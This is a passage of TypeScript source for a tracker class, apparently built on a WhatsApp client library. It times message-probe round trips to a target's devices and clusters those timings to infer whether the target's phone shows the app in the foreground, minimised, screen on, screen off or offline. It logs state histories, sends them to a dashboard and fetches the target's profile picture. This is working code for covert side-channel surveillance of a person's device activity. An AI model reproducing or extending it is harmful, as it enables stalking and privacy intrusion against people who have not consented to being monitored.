                    const mean = clusters[i].reduce((acc, val) => acc + val, 0) / clusters[i].length;
                    newCentroids.push(mean);
                } else {
                    // Keep old centroid if cluster is empty
                    newCentroids.push(centroids[i]);
                }
            }

            // Check convergence (centroids barely changed)
            converged = true;
            for (let i = 0; i < k; i++) {
                if (Math.abs(newCentroids[i] - centroids[i]) > 1) {
                    converged = false;
                    break;
                }
            }

            centroids.splice(0, k, ...newCentroids);
            iteration++;
        }

        // Build cluster objects with statistics
        const clusterObjects: RTTCluster[] = [];

        // Re-assign points to final clusters
        const finalClusters: number[][] = Array.from({ length: k }, () => []);
        for (const rtt of rttHistory) {
            let nearestCluster = 0;
            let minDistance = Math.abs(rtt - centroids[0]);

            for (let i = 1; i < k; i++) {
                const distance = Math.abs(rtt - centroids[i]);
                if (distance < minDistance) {
                    minDistance = distance;
                    nearestCluster = i;
                }
            }

            finalClusters[nearestCluster].push(rtt);
        }

        // Calculate cluster statistics
        for (let i = 0; i < k; i++) {
            if (finalClusters[i].length > 0) {
                const variance = this.calculateVariance(finalClusters[i], centroids[i]);
                const confidence = Math.min(1.0, finalClusters[i].length / 50); // More samples = higher confidence

                clusterObjects.push({
                    centroid: centroids[i],
                    samples: finalClusters[i],
                    variance: variance,
                    confidence: confidence
                });
            }
        }

        // Sort clusters by centroid (lowest RTT first)
        clusterObjects.sort((a, b) => a.centroid - b.centroid);

        return clusterObjects;
    }

    /**
     * Update thresholds adaptively based on detected clusters
     * Uses cluster boundaries instead of fixed absolute values
     * @param thresholds StateThresholds object to update
     * @param clusters Detected RTT clusters
     * @param networkBaseline Network baseline for fallback
     */
    private updateAdaptiveThresholds(
        thresholds: StateThresholds,
        clusters: RTTCluster[],
        networkBaseline: number
    ) {
        if (clusters.length >= 3) {
            // Use cluster-based thresholds (boundaries between clusters)
            // Boundary = midpoint between adjacent cluster centroids

            const cluster0 = clusters[0]; // Lowest RTT cluster (very active)
            const cluster1 = clusters[1]; // Second cluster (minimized/screen on)
            const cluster2 = clusters[2]; // Third cluster (screen off)

            // Calculate boundaries with variance-based margins
            const margin0 = Math.sqrt(cluster0.variance) * 0.5;
            const margin1 = Math.sqrt(cluster1.variance) * 0.5;

            thresholds.adjusted.veryActive = cluster0.centroid + margin0;
            thresholds.adjusted.minimized = (cluster0.centroid + cluster1.centroid) / 2;
            thresholds.adjusted.screenOn = cluster1.centroid + margin1;

            if (clusters.length >= 4) {
                const cluster3 = clusters[3]; // Fourth cluster (deep standby)
                thresholds.adjusted.screenOff = (cluster2.centroid + cluster3.centroid) / 2;
            } else {
                thresholds.adjusted.screenOff = cluster2.centroid + Math.sqrt(cluster2.variance) * 0.5;
            }

            trackerLogger.debug(
                `[ADAPTIVE THRESHOLDS] Cluster-based: ` +
                `Active: ${thresholds.adjusted.veryActive.toFixed(0)}ms, ` +
                `Minimized: ${thresholds.adjusted.minimized.toFixed(0)}ms, ` +
                `ScreenOn: ${thresholds.adjusted.screenOn.toFixed(0)}ms, ` +
                `ScreenOff: ${thresholds.adjusted.screenOff.toFixed(0)}ms`
            );
        } else {
            // Fallback to baseline-adjusted absolute thresholds
            const adjustment = networkBaseline > 500 ? 0 : networkBaseline;

            thresholds.adjusted.veryActive = thresholds.absolute.veryActive + adjustment;
            thresholds.adjusted.minimized = thresholds.absolute.minimized + adjustment;
            thresholds.adjusted.screenOn = thresholds.absolute.screenOn + adjustment;
            thresholds.adjusted.screenOff = thresholds.absolute.screenOff + adjustment;

            trackerLogger.debug(
                `[FALLBACK THRESHOLDS] Baseline-adjusted (${networkBaseline.toFixed(0)}ms): ` +
                `Active: ${thresholds.adjusted.veryActive.toFixed(0)}ms, ` +
                `Minimized: ${thresholds.adjusted.minimized.toFixed(0)}ms, ` +
                `ScreenOn: ${thresholds.adjusted.screenOn.toFixed(0)}ms, ` +
                `ScreenOff: ${thresholds.adjusted.screenOff.toFixed(0)}ms`
            );
        }
    }

    /**
     * Perform adaptive recalibration using recent samples
     * Updates baseline and thresholds based on rolling window
     * @param metrics Device metrics to recalibrate
     */
    private performAdaptiveRecalibration(metrics: DeviceMetrics) {
        const calibration = metrics.calibration;

        // Check if recalibration is due
        const samplesSinceLastRecal = calibration.samplesCollected -
            (calibration.lastRecalibration || 0);

        if (samplesSinceLastRecal < calibration.recalibrationInterval) {
            return;
        }

        trackerLogger.debug(
            `[RECALIBRATION] Starting adaptive recalibration ` +
            `(${calibration.samplesCollected} samples collected)`
        );

        // Update adaptive window (last 200 samples)
        const windowSize = 200;
        const recentSamples = metrics.rttHistory.slice(-windowSize);
        calibration.adaptiveWindow = recentSamples;

        // Recalculate baseline from adaptive window
        const newBaseline = this.calculateRobustBaseline(recentSamples);
        const oldBaseline = calibration.networkBaseline;

        // Exponential smoothing: blend old and new baseline (70% old, 30% new)
        calibration.networkBaseline = oldBaseline * 0.7 + newBaseline * 0.3;
        calibration.networkVariance = this.calculateVariance(
            recentSamples,
            calibration.networkBaseline
        );

        // Re-run clustering on recent data for adaptive threshold updates
        const recentClusters = this.performKMeansClustering(recentSamples, 4);

        // Update clusters map
        calibration.clusters.clear();
        recentClusters.forEach((cluster, index) => {
            const stateName = ['veryActive', 'minimized', 'screenOn', 'screenOff'][index] || `cluster${index}`;
            calibration.clusters.set(stateName, cluster);
        });

        // Update thresholds based on new clusters
        this.updateAdaptiveThresholds(
            metrics.thresholds,
            recentClusters,
            calibration.networkBaseline
        );

        calibration.lastRecalibration = calibration.samplesCollected;

        trackerLogger.info(
            `\n[RECALIBRATION COMPLETE] ` +
            `Baseline: ${oldBaseline.toFixed(0)}ms -> ${calibration.networkBaseline.toFixed(0)}ms, ` +
            `Variance: ${Math.sqrt(calibration.networkVariance).toFixed(0)}ms, ` +
            `Clusters: ${recentClusters.length}\n`
        );
    }

    /**
     * Update temporal pattern with new RTT sample
     * @param pattern TemporalPattern to update
     * @param rtt New RTT measurement
     * @param timestamp Timestamp of measurement
     */
    private updateTemporalPattern(pattern: TemporalPattern, rtt: number, timestamp: number) {
        // Add new sample
        pattern.samples.push({ rtt, timestamp });

        // Remove samples older than window size
        const cutoffTime = timestamp - pattern.windowSize;
        pattern.samples = pattern.samples.filter(s => s.timestamp >= cutoffTime);

        // Detect trend if we have enough samples (at least 10 samples over 30 seconds)
        if (pattern.samples.length >= 10) {
            const trend = this.detectTrend(pattern.samples);
            pattern.trendDirection = trend.direction;
            pattern.transitionDetected = trend.isTransition;
        }
    }

    /**
     * Detect trend in temporal pattern using linear regression
     * @param samples Array of RTT samples with timestamps
     * @returns Trend information
     */
    private detectTrend(samples: Array<{rtt: number; timestamp: number}>): {
        direction: 'rising' | 'falling' | 'stable';
        isTransition: boolean;
    } {
        if (samples.length < 10) {
            return { direction: 'stable', isTransition: false };
        }

        // Simple linear regression to calculate slope
        const n = samples.length;
        let sumX = 0, sumY = 0, sumXY = 0, sumXX = 0;

        // Use relative timestamps (0, 1, 2, ...) for X axis
        samples.forEach((sample, i) => {
            sumX += i;
            sumY += sample.rtt;
            sumXY += i * sample.rtt;
            sumXX += i * i;
        });

        const slope = (n * sumXY - sumX * sumY) / (n * sumXX - sumX * sumX);

        // Determine trend direction
        // Rising: slope > 10ms per sample (significant increase)
        // Falling: slope < -10ms per sample (significant decrease)
        const direction: 'rising' | 'falling' | 'stable' =
            slope > 10 ? 'rising' :
            slope < -10 ? 'falling' :
            'stable';

        // Transition detected if rising significantly (app going to background)
        // Threshold: RTT increase of > 200ms over 30 seconds
        const firstRTT = samples[0].rtt;
        const lastRTT = samples[samples.length - 1].rtt;
        const rttChange = lastRTT - firstRTT;
        const isTransition = direction === 'rising' && rttChange > 200;

        return { direction, isTransition };
    }

    /**
     * Detect outliers using MAD (Median Absolute Deviation) - more robust than standard deviation
     * @param value The value to check
     * @param history Array of historical values
     * @returns true if the value is an outlier
     */
    private isOutlier(value: number, history: number[]): boolean {
        if (history.length < 10) return false; // Need enough data

        const median = this.calculateMedian(history);
        const deviations = history.map(val => Math.abs(val - median));
        const mad = this.calculateMedian(deviations);

        // Modified Z-score using MAD
        // UPDATED: Value is outlier only if modified z-score > 10 AND value > 5000ms
        // This prevents filtering legitimate state changes while still catching extreme network glitches
        const modifiedZScore = 0.6745 * (value - median) / (mad + 0.0001); // Add small value to avoid division by zero

        return Math.abs(modifiedZScore) > 10 && value > 5000;
    }

    /**
     * Calculate median of an array
     */
    private calculateMedian(arr: number[]): number {
        if (arr.length === 0) return 0;
        const sorted = [...arr].sort((a, b) => a - b);
        const mid = Math.floor(sorted.length / 2);
        return sorted.length % 2 !== 0 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
    }

    /**
     * Calculate percentile of an array
     */
    private calculatePercentile(arr: number[], percentile: number): number {
        if (arr.length === 0) return 0;
        const sorted = [...arr].sort((a, b) => a - b);
        const index = (percentile / 100) * (sorted.length - 1);
        const lower = Math.floor(index);
        const upper = Math.ceil(index);
        const weight = index - lower;
        return sorted[lower] * (1 - weight) + sorted[upper] * weight;
    }

    /**
     * Update baseline percentiles for device-specific thresholds
     */
    private updateBaselines(metrics: DeviceMetrics) {
        if (metrics.rttHistory.length < 20) return; // Need minimum samples

        metrics.baselineP25 = this.calculatePercentile(metrics.rttHistory, 25);
        metrics.baselineP50 = this.calculatePercentile(metrics.rttHistory, 50);
        metrics.baselineP75 = this.calculatePercentile(metrics.rttHistory, 75);
        metrics.baselineP90 = this.calculatePercentile(metrics.rttHistory, 90);
    }

    /**
     * Determine device state based on absolute RTT thresholds and temporal patterns
     * @param jid Device JID
     */
    private determineDeviceState(jid: string) {
        const metrics = this.deviceMetrics.get(jid);
        if (!metrics) return;

        // 1. Check for OFFLINE state
        // If device is marked as OFFLINE (no CLIENT ACK received), keep that state
        // Only change back to active states if we receive new measurements
        if (metrics.state === DeviceState.OFFLINE) {
            // Check if this is a new measurement (device came back online)
            if (metrics.lastRtt <= 5000 && metrics.recentRtts.length > 0) {
                trackerLogger.debug(`[DEVICE ${jid}] Device came back online (RTT: ${metrics.lastRtt}ms)`);
                // Continue with normal state determination below
            } else {
                trackerLogger.debug(`[DEVICE ${jid}] Maintaining OFFLINE state`);
                return;
            }
        }

        // 2. Check calibration state - need 500 samples for reliable classification
        if (!metrics.calibration.isCalibrated) {
            const progress = metrics.calibration.samplesCollected;
            const required = metrics.calibration.requiredSamples;
            const phase = metrics.calibration.calibrationPhase;

            // Show calibration phase in status
            const phaseNames: Record<string, string> = {
                'initial': 'Initializing',
                'clustering': 'Detecting States',
                'refinement': 'Refining',
                'adaptive': 'Adaptive'
            };
            const phaseName = phaseNames[phase] || 'Calibrating';

            metrics.state = `${phaseName}... (${progress}/${required})`;
            trackerLogger.debug(
                `[DEVICE ${jid}] Calibration Phase: ${phase} - ${progress}/${required} samples`
            );
            return;
        }

        // 3. Update device-specific baseline percentiles (for reference/validation)
        this.updateBaselines(metrics);

        // 4. Use EMA (Exponential Moving Average) for smoother classification
        const currentRTT = metrics.ema;

        // 5. HYSTERESIS: Prevent rapid state flipping
        // State must be stable for at least 10 seconds before changing
        const MIN_STATE_DURATION = 10000; // 10 seconds
        const timeSinceStateChange = Date.now() - metrics.stateChangedAt;
        const canChangeState = timeSinceStateChange > MIN_STATE_DURATION;

        // 6. Determine new state using ABSOLUTE THRESHOLDS with 20% hysteresis margin
        let newState: string;
        const thresholds = metrics.thresholds.adjusted;
        const MARGIN = 1.2; // 20% margin to prevent bouncing at boundaries

        // 7. Check for temporal transition patterns first
        if (metrics.temporalPattern.transitionDetected && metrics.temporalPattern.trendDirection === 'rising') {
            // App is transitioning to background (rising RTT over 30 seconds)
            newState = DeviceState.APP_MINIMIZED;
            trackerLogger.debug(`[TEMPORAL TRANSITION] ${jid}: Detected app going to background`);
        }
        // 8. Use absolute thresholds adjusted for network baseline
        else if (currentRTT < thresholds.veryActive * MARGIN) {
            newState = DeviceState.APP_FOREGROUND;
        } else if (currentRTT < thresholds.screenOn * MARGIN) {
            newState = DeviceState.APP_MINIMIZED;
        } else if (currentRTT < thresholds.screenOff * MARGIN) {
            newState = DeviceState.SCREEN_ON;
        } else {
            newState = DeviceState.SCREEN_OFF;
        }

        // 9. Apply hysteresis - only change state if enough time has passed
        if (newState !== metrics.state && canChangeState) {
            trackerLogger.debug(
                `[STATE CHANGE] ${jid}: ${metrics.state} -> ${newState} ` +
                `(RTT: ${currentRTT.toFixed(0)}ms, Thresholds - Active: ${thresholds.veryActive.toFixed(0)}ms, ` +
                `Minimized: ${thresholds.minimized.toFixed(0)}ms, ScreenOn: ${thresholds.screenOn.toFixed(0)}ms, ` +
                `ScreenOff: ${thresholds.screenOff.toFixed(0)}ms)`
            );

            // Record state change in history
            metrics.stateHistory.push({
                state: newState,
                timestamp: Date.now(),
                rtt: metrics.lastRtt
            });

            // Keep only last 1000 state changes
            if (metrics.stateHistory.length > 1000) {
                metrics.stateHistory.shift();
            }

            metrics.state = newState;
            metrics.stateChangedAt = Date.now();
        } else if (newState !== metrics.state) {
            trackerLogger.debug(
                `[HYSTERESIS] ${jid}: Delaying state change ${metrics.state} -> ${newState} ` +
                `(${(MIN_STATE_DURATION - timeSinceStateChange) / 1000}s remaining)`
            );
        }

        // 10. Output formatted status
        const movingAvg = metrics.recentRtts.reduce((a, b) => a + b, 0) / metrics.recentRtts.length;
        const globalMedian = this.calculateGlobalMedian();
        const globalThreshold = globalMedian * 0.9;
        trackerLogger.formatDeviceState(jid, metrics.lastRtt, movingAvg, globalMedian, globalThreshold, metrics.state);

        // Debug mode: Additional debug information
        trackerLogger.debug(
            `[ADVANCED METRICS] ${jid}: ` +
            `EMA: ${metrics.ema.toFixed(0)}ms, ` +
            `Network Baseline: ${metrics.calibration.networkBaseline.toFixed(0)}ms, ` +
            `Adjusted Thresholds - Active: ${thresholds.veryActive.toFixed(0)}ms, ` +
            `Minimized: ${thresholds.minimized.toFixed(0)}ms, ` +
            `ScreenOn: ${thresholds.screenOn.toFixed(0)}ms, ` +
            `ScreenOff: ${thresholds.screenOff.toFixed(0)}ms, ` +
            `Temporal: ${metrics.temporalPattern.trendDirection}, ` +
            `History: ${metrics.rttHistory.length}, ` +
            `States recorded: ${metrics.stateHistory.length}`
        );
    }

    /**
     * Send update to client with current tracking data
     */
    private sendUpdate() {
        // Build devices array with enhanced metrics
        const devices = Array.from(this.deviceMetrics.entries()).map(([jid, metrics]) => ({
            jid,
            state: metrics.state,
            rtt: metrics.lastRtt,
            avg: metrics.recentRtts.length > 0
                ? metrics.recentRtts.reduce((a: number, b: number) => a + b, 0) / metrics.recentRtts.length
                : 0,
            ema: metrics.ema,
            stateHistory: metrics.stateHistory,
            percentiles: {
                p25: metrics.baselineP25,
                p50: metrics.baselineP50,
                p75: metrics.baselineP75,
                p90: metrics.baselineP90
            },
            historyLength: metrics.rttHistory.length,
            rttHistory: metrics.rttHistory, // Send full RTT history for detailed charts
            // Calibration data for UI progress indicator
            calibration: {
                isCalibrated: metrics.calibration.isCalibrated,
                samplesCollected: metrics.calibration.samplesCollected,
                requiredSamples: metrics.calibration.requiredSamples,
                networkBaseline: metrics.calibration.networkBaseline
            },
            // Adjusted thresholds for debugging/display
            adjustedThresholds: metrics.thresholds.adjusted
        }));

        // Calculate global stats for backward compatibility
        const globalMedian = this.calculateGlobalMedian();
        const globalThreshold = globalMedian * 0.9;

        const data = {
            devices,
            deviceCount: this.trackedJids.size,
            presence: this.lastPresence,
            // Global stats for charts
            median: globalMedian,
            threshold: globalThreshold
        };

        if (this.onUpdate) {
            this.onUpdate(data);
        }
    }

    /**
     * Calculate global median RTT across all measurements
     * @returns Median RTT value
     */
    private calculateGlobalMedian(): number {
        if (this.globalRttHistory.length < 3) return 0;

        const sorted = [...this.globalRttHistory].sort((a, b) => a - b);
        const mid = Math.floor(sorted.length / 2);
        return sorted.length % 2 !== 0 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
    }

    /**
     * Get profile picture URL for the target user
     * @returns Profile picture URL or null if not available
     */
    public async getProfilePicture() {
        try {
            return await this.sock.profilePictureUrl(this.targetJid, 'image');
        } catch (err) {
            return null;
        }
    }

    /**
     * Stop tracking and clean up resources
     */
    public stopTracking() {
        this.isTracking = false;

        // Clear all pending timeouts
        for (const timeoutId of this.probeTimeouts.values()) {
            clearTimeout(timeoutId);
        }
        this.probeTimeouts.clear();
        this.probeStartTimes.clear();
        this.probeTargets.clear();

        logger.info('Stopping tracking');
    }
}
